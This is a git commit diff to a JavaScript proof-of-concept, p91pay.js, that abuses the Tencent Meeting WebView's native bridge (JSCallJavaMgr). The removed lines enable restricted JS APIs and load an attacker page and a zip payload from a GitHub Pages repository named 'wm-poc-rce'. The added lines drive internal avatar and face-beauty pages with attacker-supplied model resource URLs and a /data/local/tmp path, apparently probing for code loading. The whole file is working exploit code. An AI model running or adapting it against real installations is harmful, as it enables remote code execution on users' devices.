ec404da22b8c552a3d8aebbf806aba8ecc0e2686
whs <401056294@qq.com>
2026-09-05 22:01:29 -0400

    add p91 avatar internal navigation probe

--- p91pay.js
+++ p91pay.js
@@ -1,40 +1,25 @@
 (function(){
-  document.title='P91TB:'+location.host;
+  document.title='P91PAY:'+location.host;
   window.__p=function(r){
     try{r=typeof r==='string'?JSON.parse(r):r}catch(e){}
-    document.title='P91CB:'+(r&&r.callId)+':'+location.host+':'+(r&&r.code)+':'+String(r&&r.message||JSON.stringify(r&&r.data||{})).slice(0,56);
+    try{window.JSCallJavaMgr.JSCallNative(JSON.stringify({module:'CommonPlugin',method:'PrintLog',param:{log:'P91CB='+JSON.stringify(r)},callId:'P91LOG'}))}catch(e){}
+    document.title='P91CB:'+(r&&r.callId)+':'+(r&&r.code)+':'+String(r&&r.message||'').slice(0,50);
   };
   function c(id,mod,m,p){
-    try{
-      window.JSCallJavaMgr.JSCallNative(JSON.stringify({
-        callback:'window.__p',module:mod,method:m,param:p,callId:id
-      }));
-    }catch(e){
-      document.title='P91TB-NOJS:'+location.host;
-    }
+    document.title='P91RUN:'+id;
+    window.JSCallJavaMgr.JSCallNative(JSON.stringify({callback:'window.__p',module:mod,method:m,param:p,callId:id}));
   }
-  if(!window.JSCallJavaMgr){document.title='P91TB-NOMGR:'+location.host;return}
-  var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
-  var atk='https://gitwhs.github.io/wm-poc-rce/p91tpl.html';
-  var zip='https://gitwhs.github.io/wm-poc-rce/p50.zip';
-  var apis=['ExportFile','DownloadIdeaFile','LoadUrl','LoadTemplateWebView','SetOpenJsApiConfig','LoadUrlByTemplate','ExecuteTemplateLoadUrl','EvaluateJavascript','execute_js_script'];
+  if(!window.JSCallJavaMgr){document.title='P91-NOBRIDGE';return}
+  var u='https://example.invalid/p91-avatar.zip';
+  var md5='11111111111111111111111111111111';
   var q=[
     ['H2','CommonPlugin','GetPerformance',{}],
-    ['C1','CommonPlugin','CheckJsApiConfig',{}],
-    ['JC','CommonPlugin','JsApiConfig',{url:official,jsApiList:apis}],
-    ['SC','CommonPlugin','SetOpenJsApiConfig',{url:official,jsApiList:apis,open:true}],
-    ['T1','CommonPlugin','LoadTemplateWebView',{url:official,template_url:official,template_id:'p91',process_pattern:0}],
-    ['LU','CommonPlugin','LoadUrlByTemplate',{url:atk,template_url:official}],
-    ['L2','CommonPlugin','ExecuteTemplateLoadUrl',{url:atk,template_url:official}],
-    ['EX','CommonPlugin','ExportFile',{fileName:'p91.bin',contentType:'application/octet-stream',url:zip}]
+    ['A1','CommonPlugin','OpenNewPage',{scheme:'wemeet://page/ar_avatar_setting',router_params:{model_resource_url:u,model_resource_md5:md5,resource_url:u,resource_md5:md5,avatar_model_path:'/data/local/tmp/p91-avatar',abi_path:'arm64-v8a',from_webView:true}}],
+    ['A2','CommonPlugin','OpenNewPage',{scheme:'wemeet://page/ar_avatar_setting?model_resource_url='+encodeURIComponent(u)+'&model_resource_md5='+md5,router_params:{model_resource_url:u,model_resource_md5:md5,from_webView:true}}],
+    ['F1','CommonPlugin','OpenNewPage',{scheme:'wemeet://page/facebeauty',router_params:{avatar_model_path:'/data/local/tmp/p91-avatar',abi_path:'arm64-v8a',from_webView:true}}],
+    ['F2','CommonPlugin','OpenNewPage',{scheme:'wemeet://page/inmeeting/setting/facebeauty',router_params:{model_resource_url:u,model_resource_md5:md5,from_webView:true}}]
   ];
   var i=0;
-  function n(){
-    if(i>=q.length){document.title='P91TB-DONE:'+location.host;return}
-    var x=q[i++];
-    document.title='P91-RUN:'+x[0];
-    c(x[0],x[1],x[2],x[3]);
-    setTimeout(n, 3500);
-  }
-  setTimeout(n, 800);
+  function n(){if(i>=q.length){document.title='P91-DONE';return}var x=q[i++];c(x[0],x[1],x[2],x[3]);setTimeout(n,5000)}
+  setTimeout(n,800);
 })();
